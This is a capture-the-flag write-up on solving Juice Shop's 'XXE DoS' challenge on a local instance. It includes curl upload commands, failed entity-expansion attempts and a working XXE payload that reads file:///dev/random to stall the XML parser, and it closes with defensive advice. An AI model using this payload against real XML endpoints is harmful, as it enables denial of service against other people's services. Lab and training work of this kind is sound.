# XXE DoS — solution

Challenge: **XXE DoS** (PCGCTF #214, 1,000 points)  
Target: local OWASP Juice Shop at `http://localhost:3000`  
Flag: `pcgCTF{47a21cc2b293f6dfaf7432bb827ab999cfcbfcd4}`

## Thought process

This is the same vulnerable endpoint as **XXE Data Access**: the deprecated B2B XML
upload at `POST /file-upload`. The challenge wants the parser to stay busy long enough
for Juice Shop's 2-second VM timeout to fire. In the source, the XML handler catches
the timeout message and calls:

```text
challengeUtils.solve(challenges.xxeDosChallenge)
```

So the goal is not a specific file read this time; it is a parser denial-of-service.
The obvious candidate is the classic "billion laughs" entity-expansion bomb.

## Attempt 1 — billion laughs

`files/billion-laughs.xml` defines `lol1` through `lol9`, each expanding the previous
entity ten times, then references `&lol9;`.

```bash
cd /home/nightingale/CTF/PCGCTF/unsolved/xxe/214-xxe-dos
F='file=@files/billion-laughs.xml;type=text/xml'
curl -s -o /tmp/dos-response.html -w 'HTTP %{http_code}\n' -F "$F" localhost:3000/file-upload
grep -o 'Maximum entity[^<]*' /tmp/dos-response.html | head -1
```

Actual output:

```text
HTTP 410
Maximum entity amplification factor exceeded, see xmlCtxtSetMaxAmplification.
```

The current image parses XML with `libxml2-wasm` 0.7.x (libxml2 2.14). Its
amplification guard stops exponential expansion before the 2-second VM timeout. The
challenge does not solve.

## Attempt 2 — quadratic blowup

I also tried the quadratic-blowup shape from Juice Shop issue #2289: a long `SYSTEM`
entity value, a second entity that references it many times, and a document element
that references the second entity many times. The parser rejects the oversized system
identifier before doing useful work:

```text
Resource limit exceeded: URI too long
```

A variant with a 190 KB external DTD comment parsed through many parameter-entity
aliases reached 2.8 seconds of wall-clock time, but the VM timeout did not fire and the
`xxeDosChallenge` remained unsolved. Adding a larger text expansion hit libxml2's
text-node or amplification limits instead.

Every amplification payload is rejected by libxml2's guards *before* the 2-second
timeout — so expansion bombs are a dead end on this image. The guards bound
*expansion*, not a single blocking **read**.

## Attempt 3 — external entity to `/dev/random` (works)

Instead of expanding data, point an external entity at a device that never reaches EOF.
With `XML_PARSE_NOENT` enabled, substitution blocks until the vm watchdog fires.

`files/dev-random-xxe.xml`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE complaint [<!ENTITY xxe SYSTEM "file:///dev/random">]>
<complaint>&xxe;</complaint>
```

```bash
cd /home/nightingale/CTF/PCGCTF/unsolved/xxe/214-xxe-dos
curl -s -o /dev/null -w 'elapsed: %{time_total}s  HTTP %{http_code}\n' \
  -F 'file=@files/dev-random-xxe.xml;type=text/xml' localhost:3000/file-upload
```

Actual output:

```text
elapsed: 2.005605s  HTTP 503
```

The ~2.0 s elapsed is the VM timeout, and the 503 is the branch that solves the
challenge. The local challenge state confirms it:

```bash
curl -s localhost:3000/api/Challenges/ | jq '.data[] | select(.id==92) | {name,solved}'
```

Actual output:

```text
{ "name": "XXE DoS", "solved": true }
```

## Flag

Juice Shop's CTF flags are `HMAC-SHA1(CTF_KEY, challenge name)`. The challenge name is
exactly `XXE DoS`, and the compose file supplies the shared key:

```bash
./evidence/derive_flag.py 'XXE DoS'
```

Actual output:

```text
pcgCTF{47a21cc2b293f6dfaf7432bb827ab999cfcbfcd4}
```

I submitted it to CTFd challenge 214. The first submission returned:

```json
{"success": true, "data": {"status": "correct", "message": "Correct"}}
```

The status check confirms the solve:

```text
XXE DoS | 1000 pts | solved_by_me=True
```

## Screenshot

![XXE DoS terminal capture](../../../../writeups/screenshots/214-xxe-dos.png)

## Takeaway

A DoS parser challenge is not always an amplification bomb. libxml2's guards stop the
classic expansion payloads before the 2-second timeout, so the obvious billion-laughs /
quadratic tricks never solve it here. The reliable lever is a **blocking external
entity** (`file:///dev/random`) that makes a single read hang past the timeout — which
solves `xxeDosChallenge` locally (verified above) and matches the platform flag accepted
by CTFd. Defence is to disable external entities and DTD loading outright; an
amplification guard alone is not enough.
